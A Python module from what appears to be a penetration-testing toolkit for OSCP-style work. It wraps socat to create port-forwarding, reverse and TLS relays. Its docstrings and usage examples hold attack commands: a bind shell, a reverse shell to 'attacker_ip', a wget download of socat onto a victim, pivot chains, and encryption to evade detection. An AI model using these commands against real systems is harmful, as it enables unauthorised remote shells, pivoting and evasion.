"""
Socat tunnel implementation.

Socat (SOcket CAT) is a multipurpose relay tool for bidirectional data transfer.
Simpler than SSH for basic port forwarding, works without authentication.
"""

import subprocess
import time
import socket
from typing import Optional

from .models import Tunnel, TunnelConfig
from ..models import Session


class SocatTunnel:
    """Socat relay for port forwarding.

    Socat is a versatile network relay tool that can forward TCP/UDP traffic
    without requiring authentication or complex setup like SSH.

    Use Cases:
        - Simple port forwarding when SSH not available
        - Relay traffic between network segments
        - Protocol conversion (TCP -> UDP, IPv4 -> IPv6)
        - File descriptor manipulation
        - Encrypted relays (SSL/TLS)

    Advantages:
        - No authentication required
        - Single binary, easy to transfer
        - Cross-platform (Linux, Windows via Cygwin)
        - Can run on victim with low privileges
        - Supports encryption (openssl)

    Disadvantages:
        - Less feature-rich than SSH
        - No built-in authentication (security risk)
        - Requires socat binary on victim

    Example:
        >>> from sessions.models import Session
        >>> from sessions.tunnel.socat import SocatTunnel
        >>>
        >>> session = Session(target='192.168.45.150', port=22)
        >>> socat = SocatTunnel(session)
        >>>
        >>> # Create relay from attacker to victim's internal service
        >>> tunnel = socat.create_relay(
        ...     local_port=8080,
        ...     remote_host='192.168.1.10',
        ...     remote_port=80
        ... )
        >>> # Now: curl http://localhost:8080  (accesses 192.168.1.10:80)
        >>>
        >>> # Generate reverse relay command for victim
        >>> cmd = socat.create_reverse_relay(
        ...     victim_port=3306,
        ...     attacker_host='192.168.45.150',
        ...     attacker_port=4444
        ... )
        >>> # Run on victim to expose internal MySQL to attacker
    """

    def __init__(self, session: Session = None, socat_path: str = 'socat'):
        """Initialize Socat tunnel handler.

        Args:
            session: Session instance with target information (optional)
            socat_path: Path to socat binary (default: 'socat' in PATH)

        Example:
            >>> # Auto-detect socat in PATH
            >>> socat = SocatTunnel(session)
            >>>
            >>> # Custom socat binary
            >>> socat = SocatTunnel(session, socat_path='/opt/socat/socat')
        """
        self.session = session
        self.socat_path = socat_path
        self.relay_process: Optional[subprocess.Popen] = None
        self.current_tunnel: Optional[Tunnel] = None

    def create_relay(self, local_port: int, remote_host: str, remote_port: int,
                    bind_address: str = '0.0.0.0',
                    protocol: str = 'tcp',
                    fork: bool = True) -> Tunnel:
        """Create socat relay on attacker machine.

        Creates a relay that forwards connections from local_port to remote_host:remote_port.

        Command:
            socat TCP-LISTEN:<local_port>,reuseaddr,fork TCP:<remote_host>:<remote_port>

        Flags:
            TCP-LISTEN: Listen for TCP connections
            reuseaddr: Allow address reuse (avoid "Address already in use")
            fork: Fork for each connection (handle multiple connections)

        Use Case:
            Forward traffic from your machine to victim's internal services:
            - Access internal web apps
            - Connect to internal databases
            - Relay to services on isolated network segments

        Args:
            local_port: Local port to listen on
            remote_host: Remote host to connect to
            remote_port: Remote port to connect to
            bind_address: Local bind address (default: 0.0.0.0 for all interfaces)
            protocol: Protocol ('tcp', 'udp') [default: tcp]
            fork: Fork for each connection (default: True)

        Returns:
            Tunnel instance

        Raises:
            RuntimeError: If relay creation fails

        Example:
            >>> # Forward local 8080 to victim's internal web server
            >>> tunnel = socat.create_relay(
            ...     local_port=8080,
            ...     remote_host='192.168.1.10',
            ...     remote_port=80
            ... )
            >>> print(tunnel.command)
            'socat TCP-LISTEN:8080,reuseaddr,fork TCP:192.168.1.10:80'
            >>> # Now browse: http://localhost:8080
            >>>
            >>> # Forward local 3306 to victim's internal MySQL
            >>> tunnel = socat.create_relay(
            ...     local_port=3306,
            ...     remote_host='192.168.1.10',
            ...     remote_port=3306
            ... )
            >>> # Now: mysql -h 127.0.0.1 -P 3306
            >>>
            >>> # UDP relay (for DNS, TFTP, etc.)
            >>> tunnel = socat.create_relay(
            ...     local_port=53,
            ...     remote_host='192.168.1.1',
            ...     remote_port=53,
            ...     protocol='udp'
            ... )

        Manual Alternative (OSCP):
            If socat not available, use netcat relay (less elegant):
            mknod backpipe p
            nc -l -p 8080 0<backpipe | nc 192.168.1.10 80 1>backpipe
        """
        proto_upper = protocol.upper()

        # Build socat command
        cmd = [self.socat_path]

        # Listen side
        listen_opts = [f'{proto_upper}-LISTEN:{local_port}']
        if bind_address != '0.0.0.0':
            listen_opts.append(f'bind={bind_address}')
        listen_opts.append('reuseaddr')
        if fork:
            listen_opts.append('fork')

        cmd.append(','.join(listen_opts))

        # Connect side
        cmd.append(f'{proto_upper}:{remote_host}:{remote_port}')

        # Create tunnel object
        config = TunnelConfig(
            local_port=local_port,
            remote_host=remote_host,
            remote_port=remote_port
        )

        tunnel = Tunnel(
            type='socat',
            session_id=self.session.id if self.session else None,
            target=remote_host,
            config=config,
            status='starting',
            command=' '.join(cmd),
            metadata={'protocol': protocol, 'bind_address': bind_address}
        )

        # Start relay process
        try:
            self.relay_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )

            tunnel.pid = self.relay_process.pid

            # Give relay time to start
            time.sleep(1)

            # Validate relay is running
            if self.relay_process.poll() is None:
                # Check if port is listening
                if self._is_port_listening(local_port):
                    tunnel.mark_active()
                    print(f"[+] Socat relay started: localhost:{local_port} -> {remote_host}:{remote_port}")
                else:
                    print(f"[!] Warning: Relay started but port {local_port} not yet listening")
            else:
                stderr = self.relay_process.stderr.read().decode('utf-8', errors='ignore')
                tunnel.mark_error(f"Relay process died: {stderr}")
                raise RuntimeError(f"Socat relay failed: {stderr}")

            self.current_tunnel = tunnel
            return tunnel

        except Exception as e:
            tunnel.mark_error(str(e))
            raise RuntimeError(f"Failed to create socat relay: {e}")

    def create_reverse_relay(self, victim_port: int, attacker_host: str,
                           attacker_port: int, protocol: str = 'tcp') -> str:
        """Generate reverse relay command for victim.

        Creates command to run on victim that forwards victim_port to attacker.
        This exposes a service on the victim's machine to the attacker.

        Command:
            socat TCP:<attacker_host>:<attacker_port> TCP:localhost:<victim_port>

        Use Case:
            Expose victim's internal services to attacker:
            - Internal databases (MySQL, PostgreSQL, MSSQL)
            - Internal web applications
            - Services bound to localhost only
            - Services on victim's internal network

        Args:
            victim_port: Port on victim to access
            attacker_host: Attacker's IP address
            attacker_port: Port on attacker to listen on
            protocol: Protocol ('tcp', 'udp') [default: tcp]

        Returns:
            Command string to run on victim

        Example:
            >>> # First, start listener on attacker
            >>> # nc -nlvp 4444
            >>>
            >>> # Generate reverse relay command
            >>> cmd = socat.create_reverse_relay(
            ...     victim_port=3306,
            ...     attacker_host='192.168.45.150',
            ...     attacker_port=4444
            ... )
            >>> print(f"Run on victim: {cmd}")
            'socat TCP:192.168.45.150:4444 TCP:localhost:3306'
            >>>
            >>> # Victim executes command, attacker can now:
            >>> # mysql -h 127.0.0.1 -P 4444
            >>>
            >>> # Expose victim's internal web admin
            >>> cmd = socat.create_reverse_relay(
            ...     victim_port=8080,
            ...     attacker_host='192.168.45.150',
            ...     attacker_port=8080
            ... )
            >>> # Attacker can now: curl http://localhost:8080

        OSCP Delivery Methods:
            Transfer socat to victim:
            1. HTTP: python3 -m http.server 80
               victim$ wget http://attacker/socat -O /tmp/socat && chmod +x /tmp/socat
            2. Base64: cat socat | base64 -w0
               victim$ echo "<base64>" | base64 -d > /tmp/socat && chmod +x /tmp/socat
            3. SMB: impacket-smbserver share . -smb2support
               victim> copy \\\\attacker\\share\\socat.exe C:\\socat.exe
        """
        proto_upper = protocol.upper()

        cmd_parts = [
            self.socat_path,
            f'{proto_upper}:{attacker_host}:{attacker_port}',
            f'{proto_upper}:localhost:{victim_port}'
        ]

        return ' '.join(cmd_parts)

    def create_encrypted_relay(self, local_port: int, remote_host: str,
                               remote_port: int, cert_file: str = None,
                               verify: bool = False) -> Tunnel:
        """Create encrypted socat relay (SSL/TLS).

        Creates relay with SSL/TLS encryption for secure tunneling.

        Command:
            socat OPENSSL-LISTEN:<local_port>,reuseaddr,fork,verify=0 TCP:<remote_host>:<remote_port>

        Use Case:
            - Encrypt traffic to evade detection
            - Secure sensitive data transfer
            - Bypass protocol inspection firewalls

        Args:
            local_port: Local port to listen on
            remote_host: Remote host to connect to
            remote_port: Remote port to connect to
            cert_file: Path to SSL certificate (optional, auto-generated if not provided)
            verify: Verify SSL certificate (default: False)

        Returns:
            Tunnel instance

        Example:
            >>> # Create encrypted relay
            >>> tunnel = socat.create_encrypted_relay(
            ...     local_port=8443,
            ...     remote_host='192.168.1.10',
            ...     remote_port=80
            ... )
            >>> # Now: curl -k https://localhost:8443

        Generate Self-Signed Certificate:
            openssl req -newkey rsa:2048 -nodes -keyout server.key \\
                -x509 -days 365 -out server.crt
            cat server.key server.crt > server.pem
        """
        # Build socat command
        cmd = [self.socat_path]

        # SSL Listen side
        listen_opts = [f'OPENSSL-LISTEN:{local_port}', 'reuseaddr', 'fork']

        if cert_file:
            listen_opts.append(f'cert={cert_file}')

        if not verify:
            listen_opts.append('verify=0')

        cmd.append(','.join(listen_opts))

        # Connect side
        cmd.append(f'TCP:{remote_host}:{remote_port}')

        # Create tunnel object
        config = TunnelConfig(
            local_port=local_port,
            remote_host=remote_host,
            remote_port=remote_port,
            extra_args=['ssl']
        )

        tunnel = Tunnel(
            type='socat',
            session_id=self.session.id if self.session else None,
            target=remote_host,
            config=config,
            status='starting',
            command=' '.join(cmd),
            metadata={'encrypted': True, 'cert_file': cert_file}
        )

        # Start relay process
        try:
            self.relay_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )

            tunnel.pid = self.relay_process.pid

            # Give relay time to start
            time.sleep(1)

            if self.relay_process.poll() is None:
                tunnel.mark_active()
                print(f"[+] Encrypted socat relay started: localhost:{local_port} -> {remote_host}:{remote_port}")
            else:
                stderr = self.relay_process.stderr.read().decode('utf-8', errors='ignore')
                tunnel.mark_error(f"Relay process died: {stderr}")
                raise RuntimeError(f"Socat relay failed: {stderr}")

            self.current_tunnel = tunnel
            return tunnel

        except Exception as e:
            tunnel.mark_error(str(e))
            raise RuntimeError(f"Failed to create encrypted relay: {e}")

    def stop(self):
        """Stop socat relay and cleanup."""
        if self.relay_process:
            try:
                self.relay_process.terminate()
                self.relay_process.wait(timeout=5)
                print("[+] Socat relay stopped")
            except subprocess.TimeoutExpired:
                self.relay_process.kill()
                print("[!] Socat relay killed (timeout)")
            finally:
                self.relay_process = None

        if self.current_tunnel:
            self.current_tunnel.mark_dead('Relay stopped by user')
            self.current_tunnel = None

    def get_usage_examples(self) -> str:
        """Get common socat usage examples.

        Returns:
            Formatted string with usage examples
        """
        return """
=== Socat Usage Examples ===

1. Basic Port Forward:
   socat TCP-LISTEN:8080,reuseaddr,fork TCP:192.168.1.10:80
   # Access localhost:8080 -> forwards to 192.168.1.10:80

2. Reverse Port Forward (run on victim):
   socat TCP:attacker_ip:4444 TCP:localhost:3306
   # Attacker's localhost:4444 -> victim's localhost:3306

3. UDP Relay:
   socat UDP-LISTEN:53,reuseaddr,fork UDP:8.8.8.8:53
   # DNS relay to Google DNS

4. Encrypted Tunnel (SSL/TLS):
   # Generate certificate:
   openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 365 -out server.crt
   cat server.key server.crt > server.pem

   # Server:
   socat OPENSSL-LISTEN:443,reuseaddr,fork,cert=server.pem,verify=0 TCP:192.168.1.10:80

   # Client:
   socat TCP-LISTEN:8080,reuseaddr,fork OPENSSL:server_ip:443,verify=0

5. Bind Shell Relay:
   socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
   # Anyone connecting to port 4444 gets a shell

6. Reverse Shell Relay:
   # Attacker:
   socat TCP-LISTEN:4444 -

   # Victim:
   socat TCP:attacker_ip:4444 EXEC:/bin/bash

7. File Transfer:
   # Receiver:
   socat TCP-LISTEN:9999 OPEN:received_file,creat

   # Sender:
   socat OPEN:file_to_send TCP:receiver_ip:9999

8. TTY Upgrade:
   socat file:`tty`,raw,echo=0 TCP-LISTEN:4444

OSCP Common Scenarios:

Internal Network Pivot:
  # Access victim's internal MySQL from Kali
  attacker$ socat TCP-LISTEN:3306,reuseaddr,fork TCP:victim_ip:3306
  # (assuming victim can reach internal DB)

Port Forward Chain:
  # Victim1 -> Victim2 -> Internal Service
  victim1$ socat TCP-LISTEN:8080,reuseaddr,fork TCP:victim2:8080
  victim2$ socat TCP-LISTEN:8080,reuseaddr,fork TCP:internal_db:3306
  attacker$ mysql -h victim1_ip -P 8080

Windows Socat (via Cygwin):
  victim> socat.exe TCP:attacker_ip:4444 TCP:localhost:3306

Flags Explained:
  TCP-LISTEN:    Listen for TCP connections
  reuseaddr:     Allow address reuse (avoid "Address already in use" error)
  fork:          Fork new process for each connection (handle multiple clients)
  EXEC:          Execute command
  OPEN:          Open file
  verify=0:      Don't verify SSL certificate
  raw,echo=0:    Raw mode, no echo (for interactive shells)
"""

    def _is_port_listening(self, port: int) -> bool:
        """Check if port is listening.

        Args:
            port: Port to check

        Returns:
            True if port is listening
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex(('127.0.0.1', port))
            sock.close()
            return result == 0
        except Exception:
            return False

    def __del__(self):
        """Cleanup on deletion."""
        self.stop()
